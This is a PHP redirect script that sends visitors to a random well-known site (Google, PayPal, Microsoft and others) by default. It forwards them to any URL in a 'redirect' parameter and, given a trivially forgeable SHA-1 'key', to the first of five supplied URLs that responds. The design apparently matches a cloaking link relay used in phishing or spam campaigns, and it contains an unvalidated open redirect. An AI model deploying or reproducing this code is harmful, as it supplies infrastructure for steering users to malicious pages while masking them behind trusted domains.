<?php
	__initialnize__();
	
	function __initialnize__(){

		$defaultTo_arr = [
			"https://www.google.com/",
			"https://apple.com/",
			"https://microsoft.com/",
			"https://play.google.com/",
			"https://support.google.com/",
			"https://www.blogger.com/",
			"https://docs.google.com/",
			"https://cloudflare.com/",
			"https://mozilla.org/",
			"https://maps.google.com/",
			"https://en.wikipedia.org/",
			"https://wordpress.org/",
			"https://europa.eu/",
			"https://googleusercontent.com/",
			"https://bp.blogspot.com/",
			"https://whatsapp.com/",
			"https://accounts.google.com/",
			"https://adobe.com/",
			"https://drive.google.com/",
			"https://vimeo.com/",
			"https://vk.com/",
			"https://github.com/",
			"https://amazon.com/",
			"https://istockphoto.com/",
			"https://terra.com.br/",
			"https://w3.org/",
			"https://jimdofree.com/",
			"https://bbc.co.uk/",
			"https://fr.wikipedia.org/",
			"https://msn.com/",
			"https://www.weebly.com/",
			"https://nih.gov/",
			"https://youronlinechoices.com/",
			"https://policies.google.com/",
			"https://live.com/",
			"https://mail.ru/",
			"https://google.co.jp/",
			"https://theguardian.com/",
			"https://google.com.br/",
			"https://myspace.com/",
			"https://brandbucket.com/",
			"https://forbes.com/",
			"https://opera.com/",
			"https://line.me/",
			"https://medium.com/",
			"https://feedburner.com/",
			"https://files.wordpress.com/",
			"https://tools.google.com/",
			"https://nytimes.com/",
			"https://nytimes.com/",
			"https://dan.com/",
			"https://bbc.com/",
			"https://who.int/",
			"https://cnn.com/",
			"https://creativecommons.org/",
			"https://netvibes.com/",
			"https://paypal.com/",
			"https://gstatic.com/",
			"https://dailymotion.com/",
			"https://developers.google.com/",
			"https://imdb.com/",
			"https://slideshare.net/",
			"https://www.yahoo.com/",
			"https://wikimedia.org/",
			"https://foxnews.com/",
			"https://list-manage.com/",
			"https://search.google.com/",
			"https://4shared.com/",
			"https://businessinsider.com/",
			"https://tinyurl.com/",
			"https://telegram.me/",
			"https://amazon.co.jp/",
			"https://telegraph.co.uk/",
			"https://issuu.com/",
			"https://wikia.com/",
			"https://wikia.com/",
			"https://independent.co.uk/",
			"https://pinterest.com/",
			"https://estadao.com.br/",
			"https://cdc.gov/",
			"https://scribd.com/",
			"https://aliexpress.com/",
			"https://rakuten.co.jp/",
			"https://nasa.gov/",
			"https://namecheap.com/",
			"https://bloomberg.com/",
			"https://booking.com/",
			"https://reuters.com/",
			"https://office.com/",
			"https://wa.me/",
			"https://marketingplatform.google.com/",
			"https://nature.com/",
			"https://gravatar.com/",
			"https://cpanel.net/",
			"https://de.wikipedia.org/",
			"https://change.org/",
			"https://dailymail.co.uk/",
			"https://enable-javascript.com/",
			"https://wp.com/",
			"https://francetvinfo.fr/",
		];

		$defaultTo = $defaultTo_arr[array_rand($defaultTo_arr)];

		if (isset($_GET["redirect"])) {
			$redirectTo = $_GET["redirect"];
		}else {
			$redirectTo = $defaultTo;
		}

		if (isset($_GET["url_01"]) && isset($_GET["url_02"]) && isset($_GET["url_03"]) && isset($_GET["url_04"]) && isset($_GET["url_05"]) && isset($_GET["key"])) {
			
			$urlTo_01 = $_GET["url_01"];
			$urlTo_02 = $_GET["url_02"];
			$urlTo_03 = $_GET["url_03"];
			$urlTo_04 = $_GET["url_04"];
			$urlTo_05 = $_GET["url_05"];
		
			$api_key = hash("sha1", $urlTo_01 . $urlTo_02 . $urlTo_03 . $urlTo_04 . $urlTo_05);

			if ($api_key == $_GET["key"]) {
			 	if (substr(@get_headers($urlTo_01)[0], 9, 3) == 200) return header("Location: " . $urlTo_01); 
				if (substr(@get_headers($urlTo_02)[0], 9, 3) == 200) return header("Location: " . $urlTo_02); 
				if (substr(@get_headers($urlTo_03)[0], 9, 3) == 200) return header("Location: " . $urlTo_03); 
				if (substr(@get_headers($urlTo_04)[0], 9, 3) == 200) return header("Location: " . $urlTo_04); 
				if (substr(@get_headers($urlTo_05)[0], 9, 3) == 200) return header("Location: " . $urlTo_05); 
			}
		}
		return header("Location: " . $redirectTo); 
	}
?>